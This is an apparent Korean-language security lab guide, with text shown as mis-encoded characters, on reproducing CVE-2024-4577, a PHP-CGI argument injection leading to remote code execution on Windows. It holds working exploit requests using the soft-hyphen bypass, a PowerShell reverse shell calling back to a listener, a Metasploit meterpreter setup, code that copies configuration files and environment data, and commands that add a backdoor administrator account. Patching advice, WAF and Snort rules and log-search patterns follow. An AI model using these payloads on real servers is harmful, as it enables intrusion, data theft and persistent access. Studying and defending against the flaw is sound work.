# CVE-2024-4577 êµ¬í˜„ ê°€ì´ë“œ
## PHP-CGI Argument Injection â†’ RCE

---

## ğŸ“‹ ëª©ì°¨
1. [ì·¨ì•½ì  ê°œìš”](#ì·¨ì•½ì -ê°œìš”)
2. [í™˜ê²½ ìš”êµ¬ì‚¬í•­](#í™˜ê²½-ìš”êµ¬ì‚¬í•­)
3. [ì„¤ì¹˜ ë° êµ¬ì„±](#ì„¤ì¹˜-ë°-êµ¬ì„±)
4. [ì·¨ì•½ì  ì›ë¦¬](#ì·¨ì•½ì -ì›ë¦¬)
5. [ê³µê²© ì‹œì—°](#ê³µê²©-ì‹œì—°)
6. [ë°©ì–´ ë°©ë²•](#ë°©ì–´-ë°©ë²•)

---

## ğŸ¯ ì·¨ì•½ì  ê°œìš”

### CVE-2024-4577 ì •ë³´
- **CVE ID**: CVE-2024-4577
- **ë°œê²¬ì¼**: 2024ë…„ 6ì›” 6ì¼
- **CVSS ì ìˆ˜**: 9.8 (Critical)
- **ë°œê²¬ì**: Orange Tsai (DEVCORE)
- **ì˜í–¥**: Remote Code Execution (RCE)

### ì·¨ì•½ì  ìœ í˜•
- PHP-CGI Argument Injection
- Unicode Character Encoding Bypass
- Windows Best-Fit Character ë³€í™˜ ì•…ìš©

### ì˜í–¥ë°›ëŠ” ë²„ì „
```
PHP 8.3.0 ~ 8.3.7   â†’ íŒ¨ì¹˜: 8.3.8
PHP 8.2.0 ~ 8.2.19  â†’ íŒ¨ì¹˜: 8.2.20
PHP 8.1.0 ~ 8.1.28  â†’ íŒ¨ì¹˜: 8.1.29
```

---

## ğŸ’» í™˜ê²½ ìš”êµ¬ì‚¬í•­

### í•„ìˆ˜ ì¡°ê±´
1. **ìš´ì˜ì²´ì œ**: Windows Server 2019 (ë˜ëŠ” Windows 10/11)
2. **ì›¹ì„œë²„**: Apache 2.4+
3. **PHP**: 8.1.0 ~ 8.1.28 (ì·¨ì•½ ë²„ì „)
4. **PHP ì‹¤í–‰ ëª¨ë“œ**: **PHP-CGI** (í•„ìˆ˜!)

### ì¤‘ìš” ì‚¬í•­
âš ï¸ **Apache + mod_php êµ¬ì„±ì—ì„œëŠ” ë™ì‘í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤!**
âœ… **ë°˜ë“œì‹œ PHP-CGI ëª¨ë“œë¡œ ì„¤ì •í•´ì•¼ í•©ë‹ˆë‹¤.**

---

## ğŸ”§ ì„¤ì¹˜ ë° êµ¬ì„±

### 1ë‹¨ê³„: PHP-CGI ì„¤ì¹˜

#### Option A: XAMPP ì‚¬ìš© (ê¶Œì¥)
```powershell
# 1. XAMPP ë‹¤ìš´ë¡œë“œ ë° ì„¤ì¹˜
https://www.apachefriends.org/download.html

# 2. PHP ë²„ì „ í™•ì¸ (ì·¨ì•½ ë²„ì „ì¸ì§€ ì²´í¬)
C:\xampp\php\php.exe --version

# 3. PHP-CGI ëª¨ë“œ í™•ì¸
C:\xampp\php\php-cgi.exe --version
```

#### Option B: ìˆ˜ë™ ì„¤ì¹˜
```powershell
# 1. PHP 8.1.28 ë‹¤ìš´ë¡œë“œ
https://windows.php.net/downloads/releases/archives/

# 2. C:\phpì— ì••ì¶• í•´ì œ

# 3. php.ini ì„¤ì •
cp C:\php\php.ini-development C:\php\php.ini

# 4. php.ini ìˆ˜ì •
cgi.force_redirect = 0
cgi.fix_pathinfo = 1
```

### 2ë‹¨ê³„: Apache CGI ì„¤ì •

#### httpd.conf ìˆ˜ì •
```apache
# C:\xampp\apache\conf\httpd.conf

# CGI ëª¨ë“ˆ í™œì„±í™”
LoadModule cgi_module modules/mod_cgi.so
LoadModule actions_module modules/mod_actions.so

# PHP-CGI í•¸ë“¤ëŸ¬ ì„¤ì •
ScriptAlias /php-cgi "C:/xampp/php/php-cgi.exe"
Action application/x-httpd-php "/php-cgi"
AddHandler application/x-httpd-php .php

# CGI ì‹¤í–‰ ê¶Œí•œ
<Directory "C:/xampp/htdocs">
    Options +ExecCGI
    AllowOverride All
</Directory>
```

### 3ë‹¨ê³„: í”„ë¡œì íŠ¸ íŒŒì¼ ë°°ì¹˜

```powershell
# ì›¹ ë£¨íŠ¸ë¡œ í”„ë¡œì íŠ¸ ë³µì‚¬
xcopy "C:\Users\User\Documents\GitHub\HyundaiAutoever_ITsecurity_project4\1x_inv\website" "C:\xampp\htdocs\1x_inv" /E /I /Y

# Apache ì¬ì‹œì‘
C:\xampp\apache_restart.bat
```

### 4ë‹¨ê³„: ì„¤ì • í™•ì¸

ë¸Œë¼ìš°ì €ì—ì„œ ì ‘ì†:
```
http://localhost/1x_inv/vulnerable_cgi.php?debug=1
```

**í™•ì¸ ì‚¬í•­**:
- Server API: **CGI/FastCGI** (mod_phpê°€ ì•„ë‹ˆì–´ì•¼ í•¨!)
- PHP Version: 8.1.x ~ 8.2.19
- OS: Windows

---

## ğŸ” ì·¨ì•½ì  ì›ë¦¬

### 1. Windows Best-Fit Character ë³€í™˜

WindowsëŠ” íŠ¹ì • ë¡œì¼€ì¼ì—ì„œ "Best-Fit" ë¬¸ì ë§¤í•‘ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤:

```
0xAD (Soft Hyphen) â†’ 0x2D (Hyphen '-')
```

### 2. CVE-2012-1823 ìš°íšŒ

#### ê³¼ê±° (CVE-2012-1823)
```php
// PHPëŠ” ì¿¼ë¦¬ìŠ¤íŠ¸ë§ì—ì„œ '-'ë¥¼ ì°¨ë‹¨í–ˆìŒ
?-d allow_url_include=1  âŒ BLOCKED
```

#### í˜„ì¬ (CVE-2024-4577)
```php
// Soft Hyphen(0xAD)ì„ ì‚¬ìš©í•˜ë©´ ìš°íšŒ ê°€ëŠ¥
?%ADd allow_url_include=1  âœ… BYPASSED!

// Windowsê°€ ìë™ìœ¼ë¡œ ë³€í™˜
%AD â†’ -

// ìµœì¢…ì ìœ¼ë¡œ PHP-CGIì— ì „ë‹¬ë˜ëŠ” ê²ƒ
-d allow_url_include=1
```

### 3. ê³µê²© íë¦„

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. ê³µê²©ìê°€ ìš”ì²­ â”‚
â”‚   %AD í¬í•¨       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 2. Windows ë³€í™˜  â”‚
â”‚   %AD â†’ -        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 3. PHP-CGI í•´ì„  â”‚
â”‚   -d flag ì¸ì‹   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 4. ì„¤ì • ë³€ê²½     â”‚
â”‚   allow_url_*=1  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 5. ì½”ë“œ ì‹¤í–‰     â”‚
â”‚   php://input    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 4. í•µì‹¬ Exploit êµ¬ì„±ìš”ì†Œ

```
vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input

ë¶„ì„:
â”œâ”€ %AD           : Soft Hyphen (Windowsê°€ '-'ë¡œ ë³€í™˜)
â”œâ”€ d             : 'd'ì™€ ê²°í•©ë˜ì–´ '-d' í”Œë˜ê·¸ ìƒì„±
â”œâ”€ allow_url_include%3d1  : URL include í™œì„±í™” (%3d = '=')
â”œâ”€ +-d+          : ì¶”ê°€ -d í”Œë˜ê·¸
â””â”€ auto_prepend_file%3dphp://input : POST ë°ì´í„°ë¥¼ PHPë¡œ ì‹¤í–‰

POST Body:
<?php system('whoami'); ?>
```

---

## ğŸš€ ê³µê²© ì‹œì—°

### ë°©ë²• 1: Python Exploit Script ì‚¬ìš©

```bash
# ì˜ì¡´ì„± ì„¤ì¹˜
pip install requests colorama

# ì·¨ì•½ì  í™•ì¸
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --check

# ë‹¨ì¼ ëª…ë ¹ ì‹¤í–‰
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php -c "system('whoami');"

# ëŒ€í™”í˜• ì‰˜
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --shell

# íŒŒì¼ ì½ê¸°
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --read "C:\\Windows\\System32\\drivers\\etc\\hosts"

# ì›¹ì‰˜ ì—…ë¡œë“œ
python exploit_cve_2024_4577.py -t http://localhost/1x_inv/vulnerable_cgi.php --upload
```

### ë°©ë²• 2: cURL ì‚¬ìš© (ìˆ˜ë™)

#### í…ŒìŠ¤íŠ¸ 1: phpinfo() ì‹¤í–‰
```bash
curl -X POST "http://localhost/1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php phpinfo(); ?>"
```

#### í…ŒìŠ¤íŠ¸ 2: ì‹œìŠ¤í…œ ëª…ë ¹ ì‹¤í–‰
```bash
curl -X POST "http://localhost/1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('whoami'); ?>"
```

#### í…ŒìŠ¤íŠ¸ 3: íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼
```bash
curl -X POST "http://localhost/1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php echo file_get_contents('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts'); ?>"
```

### ë°©ë²• 3: Burp Suite / OWASP ZAP

```http
POST /1x_inv/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

<?php system('ipconfig'); ?>
```

### ë°©ë²• 4: Metasploit (ê³ ê¸‰)

```bash
# Metasploit Framework
use exploit/windows/http/php_cgi_arg_injection
set RHOSTS 192.168.1.100
set TARGETURI /1x_inv/vulnerable_cgi.php
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

---

## ğŸ”¬ ê³ ê¸‰ Payload ì˜ˆì œ

### 1. Reverse Shell (Windows)

```powershell
# PowerShell Reverse Shell
$payload = @"
<?php
\$client = new-object System.Net.Sockets.TcpClient('192.168.1.50',4444);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
?>
"@

# ë¦¬ìŠ¤ë„ˆ ì‹œì‘ (ê³µê²©ì ë¨¸ì‹ )
nc -lvnp 4444

# Payload ì „ì†¡
curl -X POST "http://target/vulnerable_cgi.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d $payload
```

### 2. ë°ì´í„° íƒˆì·¨

```php
<?php
// ë°ì´í„°ë² ì´ìŠ¤ ì„¤ì • íŒŒì¼ ì½ê¸°
$config = file_get_contents('../api/config.php');
file_put_contents('C:\\xampp\\htdocs\\stolen_config.txt', $config);

// í™˜ê²½ ë³€ìˆ˜ íƒˆì·¨
$env = print_r($_ENV, true);
file_put_contents('C:\\xampp\\htdocs\\stolen_env.txt', $env);
?>
```

### 3. ê¶Œí•œ ìƒìŠ¹

```php
<?php
// ìƒˆë¡œìš´ ê´€ë¦¬ì ê³„ì • ìƒì„± (Windows)
system('net user hacker P@ssw0rd123! /add');
system('net localgroup administrators hacker /add');

// SSH í™œì„±í™” (Windows Server)
system('powershell Add-WindowsCapability -Online -Name OpenSSH.Server');
system('powershell Start-Service sshd');
?>
```

---

## ğŸ›¡ï¸ ë°©ì–´ ë°©ë²•

### 1. ì¦‰ì‹œ ì¡°ì¹˜ (ê¸´ê¸‰)

```bash
# PHP ì—…ê·¸ë ˆì´ë“œ
- PHP 8.3.8 ì´ìƒ
- PHP 8.2.20 ì´ìƒ
- PHP 8.1.29 ì´ìƒ
```

### 2. Apache ì„¤ì • ë³€ê²½

```apache
# .htaccessì— ì¶”ê°€
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Soft Hyphen(0xAD) ì°¨ë‹¨
    RewriteCond %{QUERY_STRING} %AD [NC,OR]
    RewriteCond %{QUERY_STRING} \xAD [NC]
    RewriteRule .* - [F,L]
</IfModule>
```

### 3. WAF ê·œì¹™

```
# ModSecurity ê·œì¹™
SecRule QUERY_STRING "@contains %ad" \
    "id:2024001,\
    phase:1,\
    deny,\
    status:403,\
    msg:'CVE-2024-4577 Attempt Detected'"
```

### 4. PHP ì„¤ì • ê°•í™”

```ini
; php.ini
cgi.force_redirect = 1
cgi.fix_pathinfo = 0
allow_url_include = Off
allow_url_fopen = Off
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
open_basedir = /var/www/html
```

### 5. mod_phpë¡œ ì „í™˜ (ê¶Œì¥)

```apache
# CGI ëŒ€ì‹  mod_php ì‚¬ìš©
LoadModule php_module modules/libphp.so
<FilesMatch \.php$>
    SetHandler application/x-httpd-php
</FilesMatch>
```

---

## ğŸ“Š íƒì§€ ë°©ë²•

### 1. ë¡œê·¸ ë¶„ì„

```bash
# Apache Access Log
grep "%AD" /var/log/apache2/access.log
grep "auto_prepend_file" /var/log/apache2/access.log
grep "allow_url_include" /var/log/apache2/access.log
```

### 2. IDS/IPS ì‹œê·¸ë‹ˆì²˜

```
# Snort Rule
alert tcp any any -> any 80 (
    msg:"CVE-2024-4577 PHP-CGI Argument Injection Attempt";
    content:"%AD";
    http_uri;
    content:"allow_url_include";
    http_uri;
    sid:2024001;
    rev:1;
)
```

### 3. SIEM ì¿¼ë¦¬ (Splunk)

```spl
index=web_logs
| search uri="*%AD*" OR uri="*auto_prepend_file*"
| stats count by src_ip, uri
| where count > 5
```

---

## ğŸ“ í•™ìŠµ ëª©í‘œ ë‹¬ì„± ì²´í¬ë¦¬ìŠ¤íŠ¸

- [ ] CVE-2024-4577 ì·¨ì•½ì  ì›ë¦¬ ì´í•´
- [ ] Windows Best-Fit ë¬¸ì ë³€í™˜ ì´í•´
- [ ] PHP-CGI vs mod_php ì°¨ì´ì  íŒŒì•…
- [ ] ì‹¤ì œ í™˜ê²½ì—ì„œ exploit ì„±ê³µ
- [ ] Reverse shell íšë“ ê²½í—˜
- [ ] ë°©ì–´ ê¸°ë²• êµ¬í˜„ ë° í…ŒìŠ¤íŠ¸
- [ ] ë¡œê·¸ ë¶„ì„ ë° íƒì§€ ë°©ë²• í•™ìŠµ

---

## ğŸ“š ì°¸ê³  ìë£Œ

1. **ê³µì‹ CVE**: https://nvd.nist.gov/vuln/detail/CVE-2024-4577
2. **DEVCORE ë¶„ì„**: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/
3. **PoC GitHub**: https://github.com/watchtowrlabs/CVE-2024-4577
4. **PHP íŒ¨ì¹˜**: https://www.php.net/ChangeLog-8.php

---

## âš ï¸ ë²•ì  ê³ ì§€

ì´ ìë£ŒëŠ” **êµìœ¡ ë° ë³´ì•ˆ ì—°êµ¬ ëª©ì **ìœ¼ë¡œë§Œ ì‚¬ìš©ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

- ìŠ¹ì¸ë˜ì§€ ì•Šì€ ì‹œìŠ¤í…œì— ëŒ€í•œ ê³µê²©ì€ ë¶ˆë²•ì…ë‹ˆë‹¤
- ë³¸ì¸ ì†Œìœ  ë˜ëŠ” ëª…ì‹œì  í—ˆê°€ë¥¼ ë°›ì€ ì‹œìŠ¤í…œì—ì„œë§Œ í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”
- ë¬´ë‹¨ ì¹¨ì… ì‹œ í˜•ì‚¬ ì²˜ë²Œ ëŒ€ìƒì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤

**í…ŒìŠ¤íŠ¸ í™˜ê²½**: ê²©ë¦¬ëœ ì‹¤ìŠµ ë„¤íŠ¸ì›Œí¬ì—ì„œë§Œ ì§„í–‰í•˜ì„¸ìš”!

---

## ğŸ“ ë¬¸ì˜

ê¸°ìˆ  ì§€ì›: security-team@1xinv.com
í”„ë¡œì íŠ¸: https://github.com/Ggoon23/HyundaiAutoever_ITsecurity_project4
